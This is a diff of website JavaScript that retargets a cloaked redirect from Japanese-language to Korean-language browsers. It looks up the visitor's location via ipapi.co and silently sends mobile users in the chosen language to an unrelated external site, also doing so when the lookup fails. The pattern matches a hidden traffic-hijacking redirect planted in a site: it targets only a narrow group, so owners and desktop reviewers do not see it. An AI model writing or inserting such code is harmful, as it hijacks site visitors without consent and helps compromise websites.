@@ -39,16 +39,15 @@
       return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-function isJapaneseLang() {
-    return navigator.language.startsWith('ja') || 
-           navigator.languages.some(lang => lang.startsWith('ja'));
+function isKoreanLang() {
+    return navigator.language.startsWith('ko') || 
+           navigator.languages.some(lang => lang.startsWith('ko'));
 }
-
     fetch('https://ipapi.co/json/')
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (isJapaneseLang() && isMobileDevice() ) {
+        if (isKoreanLang() && isMobileDevice() ) {
           window.location.href = "https://silverswanrecruitment.com/usa/";
           return;
         }
@@ -62,7 +61,7 @@ function isJapaneseLang() {
       })
       .catch(() => {
         // IP检测失败时严格的双重条件判断
-        if (isMobileDevice() && isJapaneseLang()) {
+        if (isMobileDevice() && isKoreanLang()) {
           window.location.href = "https://silverswanrecruitment.com/usa/";
           return;
         }
